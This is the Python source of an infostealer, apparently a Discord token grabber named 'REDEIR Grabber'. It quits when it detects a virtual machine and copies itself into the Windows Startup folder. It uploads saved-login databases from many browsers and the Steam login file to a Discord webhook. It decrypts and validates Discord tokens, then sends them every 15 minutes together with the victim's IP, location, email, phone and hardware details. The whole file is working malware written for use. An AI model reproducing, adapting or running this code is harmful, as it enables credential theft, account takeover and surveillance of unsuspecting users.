import os
import sys
import wmi
import time
import json
import shutil
import psutil
import easygui
import requests
import platform
from re import findall
from base64 import b64decode
from datetime import datetime
from Crypto.Cipher import AES
from psutil import virtual_memory
from subprocess import Popen, PIPE
from win32crypt import CryptUnprotectData
from urllib.request import Request, urlopen

roaming = os.path.expanduser("~") + '\\AppData\\Roaming'
local = os.path.expanduser("~") + '\\AppData\\Local'
chrome = local + '\\Google\\Chrome\\User Data\\'

def is_virtual_machine():
    system_info = platform.uname()
    if "Microsoft" in system_info.release:
        return True
    if "Linux" in system_info.system:
        with open("/proc/1/cgroup", "r") as cgroup_file:
            for line in cgroup_file:
                if "docker" in line or "lxc" in line:
                    return True
    return False

def add_to_startup():
    if getattr(sys, 'frozen', False):
        currentFilePath = os.path.dirname(sys.executable)
    else:
        currentFilePath = os.path.dirname(os.path.abspath(__file__))

    fileName = os.path.basename(sys.argv[0])
    filePath = os.path.join(currentFilePath, fileName)

    startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    startupFilePath = os.path.join(startupFolderPath, fileName)

    if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():
        with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
            shutil.copyfileobj(src_file, dst_file)

def bytes_to_gigabytes(bytes_value):
    return bytes_value / (1024 ** 3)

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"

def send_file_to_webhook(file_path, webhook_url):
    with open(file_path, "rb") as file:
        file_content = file.read()

    files = {'file': ('loginusers.vdf', file_content)}

    payload = {
        'username': 'Steam Info',         
        'avatar_url': 'https://cdn.discordapp.com/attachments/1142208084295569408/1145534641747529878/image.png'
    }

    response = requests.post(webhook_url, data=payload, files=files)
    if response.status_code == 200:
        print("")
    else:
        print("")

def get_gpu():
    c = wmi.WMI()
    gpu_info = c.Win32_VideoController()[0]
    return f"{gpu_info.Name}"

def get_cpu():
    c = wmi.WMI()
    cpu_info = c.Win32_Processor()[0]
    return f"{cpu_info.Name}"

def get_ram():
    memory = virtual_memory()
    return f"{bytes_to_gigabytes(memory.total):.2f} GB"

def get_storage():
    c = wmi.WMI()
    for drive in c.Win32_DiskDrive():
        size_in_bytes = int(drive.Size)
        return f"{bytes_to_gigabytes(size_in_bytes):.2f} GB"

def get_motherboard():
    c = wmi.WMI()
    motherboard_info = c.Win32_BaseBoard()[0]
    return f"{motherboard_info.Product}"

def get_sys():
    system_info = platform.uname()
    return f"{system_info.system} {system_info.release}"

def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

def get_ip_info():
    ip_address = getip()
    api_url = f"https://api.iplocation.net/?ip={ip_address}"
    response = requests.get(api_url)
    if response.status_code == 200:
        data = response.json()
        country_name = data.get("country_name", "Unknown")
        country_code = data.get("country_code2", "Unknown")
        isp = data.get("isp", "Unknown")
        return f"{country_name} ({country_code}), ISP: {isp}"
    else:
        return ip

def get_hwid():
    c = wmi.WMI()
    system_info = c.Win32_ComputerSystemProduct()[0]
    return system_info.UUID

def send_embed_to_webhook(embed_data, webhook_url):
    headers = {
        'Content-Type': 'application/json'
    }

    payload = {
        'embeds': [embed_data]
    }

    response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
    if response.status_code == 204:
        print(" ")
    else:
        print(f" ")

def main():
    webhook_url = 'https://discord.com/api/webhooks/' #utilisez un webhook unique a chaque grab

    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }
    for application, chemin in paths.items():
        chemin_login_data = os.path.join(chemin, 'Login Data')
        if os.path.exists(chemin_login_data):
            with open(chemin_login_data, 'rb') as fichier_login:
                files = {'file': ('Login_Data.db', fichier_login, 'application/octet-stream')}

                payload = {
                    'username': f'{application} Info',
                    'avatar_url': 'https://cdn.discordapp.com/attachments/1142208084295569408/1145534641747529878/image.png' 
                }

                response = requests.post(webhook_url, data=payload, files=files)
                if response.status_code == 204:
                    print(f"")
                else:
                    print(f"")
                    

    tokens = []
    cleaned = []
    checker = []

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        try:
            with open(path + f"\\Local State", "r") as file:
                key = json.loads(file.read())['os_crypt']['encrypted_key']
        except (FileNotFoundError, PermissionError):
            continue

        for file in os.listdir(path + f"\\Local Storage\\leveldb\\"):
            if not file.endswith(".ldb") and file.endswith(".log"):
                continue
            else:
                try:
                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                        for x in files.readlines():
                            x = x.strip()
                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                tokens.append(values)
                except PermissionError:
                    continue

        for i in tokens:
            try:
                if i.endswith("\\"):
                    i.replace("\\", "")
                elif i not in cleaned:
                    cleaned.append(i)
            except PermissionError:
                continue

        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError:
                continue
            checker.append((tok, platform))

    already_check = []

    for value, platform in checker:
        if value not in already_check:
            already_check.append(value)
            headers = {'Authorization': value, 'Content-Type': 'application/json'}
            try:
                res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
            except:
                continue
            if res.status_code == 200:
                res_json = res.json()
                ip = getip()
                ipinfo = get_ip_info()
                hwid = get_hwid()
                sys = get_sys()
                gpu = get_gpu()
                cpu = get_cpu()
                ram = get_ram()
                cm = get_motherboard()
                storage = get_storage()
                pc_username = os.getenv("UserName")
                pc_name = os.getenv("COMPUTERNAME")
                user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                user_id = res_json['id']
                email = res_json['email']
                phone = res_json['phone']
                mfa_enabled = res_json['mfa_enabled']
                has_nitro = False
                res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                nitro_data = res.json()
                has_nitro = bool(len(nitro_data) > 0)
                embed = f"""**{user_name}** *({user_id})*\n
                - :rocket:__Grab__\n\tIP: `{ip}`\n\tIP Info: `{ipinfo}`\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\tNitro: `{has_nitro}`\n\t2FA: `{mfa_enabled}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tHWID: `{hwid}`\n\tOS: `{sys}`\n\tPlatform: `{platform}`\n\tToken: `{tok}`\n
                - :robot:__Component__\n\tGPU: `{gpu}`\n\tCPU: `{cpu}`\n\tRam: `{ram}`\n\tMotherboard: `{cm}`\n\tStorage: `{storage}`\n
                - :pencil:__Credit__\n\tBy: *mattfr48 made for RAF and REDEIR* \ndiscord.gg/droit discord.gg/DEwbu6t4jZ\n""" #merci de ne pas changer cette ligne !
                payload = json.dumps({'content': embed, 'username': 'REDEIR Grabber', 'avatar_url': 'https://cdn.discordapp.com/attachments/1142208084295569408/1145534641747529878/image.png'})
                try:
                    headers2 = {
                        'Content-Type': 'application/json',
                        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                    }
                    req = Request(webhook_url, data=payload.encode(), headers=headers2)
                    urlopen(req)
                except:
                    continue

if __name__ == '__main__':
    if is_virtual_machine():
        sys.exit(0)
    add_to_startup()
    webhook_url = 'https://discord.com/api/webhooks/' #webhook

    while True:
        steam_config_path = r'C:\Program Files (x86)\Steam\config\loginusers.vdf'
        if os.path.exists(steam_config_path):
            send_file_to_webhook(steam_config_path, webhook_url)
        main()
        time.sleep(900)
